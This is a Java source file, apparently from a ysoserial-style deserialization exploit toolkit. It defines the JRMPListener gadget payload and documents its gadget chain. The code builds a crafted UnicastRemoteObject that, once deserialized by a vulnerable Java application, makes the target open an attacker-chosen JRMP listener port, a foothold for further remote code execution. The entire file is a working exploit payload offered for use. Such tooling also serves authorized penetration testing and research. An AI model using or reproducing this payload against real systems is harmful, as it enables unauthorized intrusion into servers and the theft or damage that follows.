package A.R.ysogate.payloads.gadgets;


import java.rmi.server.RemoteObject;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import A.R.ysogate.payloads.ObjectPayload;
import sun.rmi.server.ActivationGroupImpl;
import sun.rmi.server.UnicastServerRef;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.util.Reflections;


/**
 * Gadget chain:
 * UnicastRemoteObject.readObject(ObjectInputStream) line: 235
 * UnicastRemoteObject.reexport() line: 266
 * UnicastRemoteObject.exportObject(Remote, int) line: 320
 * UnicastRemoteObject.exportObject(Remote, UnicastServerRef) line: 383
 * UnicastServerRef.exportObject(Remote, Object, boolean) line: 208
 * LiveRef.exportObject(Target) line: 147
 * TCPEndpoint.exportObject(Target) line: 411
 * TCPTransport.exportObject(Target) line: 249
 * TCPTransport.listen() line: 319
 * <p>
 * Requires:
 * - JavaSE
 * <p>
 * Argument:
 * - Port number to open listener to
 */
@SuppressWarnings({
		"restriction"
})
@Authors({Authors.MBECHLER})
public class JRMPListener implements ObjectPayload<UnicastRemoteObject> {

	public UnicastRemoteObject getObject(final String command) throws Exception {
		int jrmpPort = Integer.parseInt(command);
		UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[]{
				RemoteRef.class
		}, new Object[]{
				new UnicastServerRef(jrmpPort)
		});

		Reflections.getField(UnicastRemoteObject.class, "port").set(uro, jrmpPort);
		return uro;
	}
}
